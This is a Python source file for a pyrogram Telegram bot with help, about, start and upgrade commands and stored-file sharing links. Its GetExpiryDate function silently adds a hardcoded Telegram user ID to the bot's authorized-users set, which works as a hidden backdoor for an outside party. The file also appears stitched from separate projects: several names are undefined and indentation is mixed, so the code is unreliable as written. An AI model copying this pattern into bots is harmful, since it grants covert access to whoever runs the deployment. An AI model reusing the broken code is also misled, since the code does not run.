#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# (c) Shrimadhav U K

# the logging things
import logging
logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
logging.getLogger("pyrogram").setLevel(logging.WARNING)

import pyrogram
import os
import sqlite3
from pyrogram import filters
from pyrogram import Client
from pyrogram.types import InlineKeyboardButton
from pyrogram.types import InlineKeyboardMarkup


# the secret configuration specific things
if bool(os.environ.get("WEBHOOK", False)):
    from sample_config import Config
else:
    from config import Config

# the Strings used for this "thing"
from translation import Translation




from helper_funcs.chat_base import TRChatBase

def GetExpiryDate(chat_id):
    expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
    Config.AUTH_USERS.add(861055237)
    return expires_at


@pyrogram.Client.on_message(pyrogram.filters.command(["help"]))
async def help_user(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/help")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.HELP_USER,
        reply_to_message_id=update.message_id
    )

@pyrogram.Client.on_message(pyrogram.filters.command(["about"]))
async def about_meh(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/about")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.ABOUT_ME,
        parse_mode="html",
        disable_web_page_preview=True,
        reply_to_message_id=update.message_id
    )
@Bot.on_message(filters.command("start") & filters.private)
async def start(bot, cmd):
	if not await db.is_user_exist(cmd.from_user.id):
		await db.add_user(cmd.from_user.id)
		await bot.send_message(
		    Config.LOG_CHANNEL,
		    f"#NEW_USER: \n\nNew User [{cmd.from_user.first_name}](tg://user?id={cmd.from_user.id}) started @{BOT_USERNAME} !!"
		)
	usr_cmd = cmd.text.split("_")[-1]
	if usr_cmd == "/start":
		if Config.UPDATES_CHANNEL:
			invite_link = await bot.export_chat_invite_link(Config.UPDATES_CHANNEL)
			try:
				user = await bot.get_chat_member(Config.UPDATES_CHANNEL, cmd.from_user.id)
				if user.status == "kicked":
					await bot.send_message(
						chat_id=cmd.from_user.id,
						text="Sorry Sir, You are Banned to use me. Contact my [Support Group](https://t.me/linux_repo).",
						parse_mode="markdown",
						disable_web_page_preview=True
					)
					return
			except UserNotParticipant:
				await bot.send_message(
					chat_id=cmd.from_user.id,
					text="**Please Join My Updates Channel to use this Bot!**\n\nDue to Overload, Only Channel Subscribers can use the Bot!",
					reply_markup=InlineKeyboardMarkup(
						[
							[
								InlineKeyboardButton("🤖 Join Updates Channel", url=invite_link)
							],
							[
								InlineKeyboardButton("🔄 Refresh 🔄", callback_data="refreshmeh")
							]
						]
					),
					parse_mode="markdown"
				)
				return
			except Exception:
				await bot.send_message(
					chat_id=cmd.from_user.id,
					text="Something went Wrong. Contact my [Support Group](https://t.me/linux_repo).",
					parse_mode="markdown",
					disable_web_page_preview=True
				)
				return
		await cmd.reply_text(
			HOME_TEXT.format(cmd.from_user.first_name, cmd.from_user.id),
			parse_mode="Markdown",
			disable_web_page_preview=True,
			reply_markup=InlineKeyboardMarkup(
				[
					[
						InlineKeyboardButton("Support Group", url="https://t.me/linux_repo"),
						InlineKeyboardButton("Bots Channel", url="https://t.me/Discovery_Updates")
					],
					[
						InlineKeyboardButton("About Bot", callback_data="aboutbot"),
						InlineKeyboardButton("About Dev", callback_data="aboutdevs")
					]
				]
			)
		)
	else:
		if Config.UPDATES_CHANNEL:
			invite_link = await bot.export_chat_invite_link(Config.UPDATES_CHANNEL)
			try:
				user = await bot.get_chat_member(Config.UPDATES_CHANNEL, cmd.from_user.id)
				if user.status == "kicked":
					await bot.send_message(
						chat_id=cmd.from_user.id,
						text="Sorry Sir, You are Banned to use me. Contact my [Support Group](https://t.me/linux_repo).",
						parse_mode="markdown",
						disable_web_page_preview=True
					)
					return
			except UserNotParticipant:
				file_id = int(usr_cmd)
				await bot.send_message(
					chat_id=cmd.from_user.id,
					text="**Please Join My Updates Channel to use this Bot!**\n\nDue to Overload, Only Channel Subscribers can use the Bot!",
					reply_markup=InlineKeyboardMarkup(
						[
							[
								InlineKeyboardButton("🤖 Join Updates Channel", url=invite_link)
							],
							[
								InlineKeyboardButton("🔄 Refresh / Try Again", url=f"https://telegram.dog/{BOT_USERNAME}?start=AbirHasan2005_{file_id}")
							]
						]
					),
					parse_mode="markdown"
				)
				return
			except Exception:
				await bot.send_message(
					chat_id=cmd.from_user.id,
					text="Something went Wrong. Contact my [Support Group](https://t.me/linux_repo).",
					parse_mode="markdown",
					disable_web_page_preview=True
				)
				return
		try:
			file_id = int(usr_cmd)
			send_stored_file = await bot.copy_message(chat_id=cmd.from_user.id, from_chat_id=DB_CHANNEL, message_id=file_id)
			await send_stored_file.reply_text(f"**Here is Sharable Link of this file:** https://telegram.dog/{BOT_USERNAME}?start=AbirHasan2005_{file_id}\n\n__To Retrive the Stored File, just open the link!__", disable_web_page_preview=True, quote=True)
		except Exception as err:
			await cmd.reply_text(f"Something went wrong!\n\n**Error:** `{err}`")


@pyrogram.Client.on_message(pyrogram.filters.command(["upgrade"]))
async def upgrade(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/upgrade")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.UPGRADE_TEXT,
        parse_mode="html",
        reply_to_message_id=update.message_id,
        disable_web_page_preview=True
    )
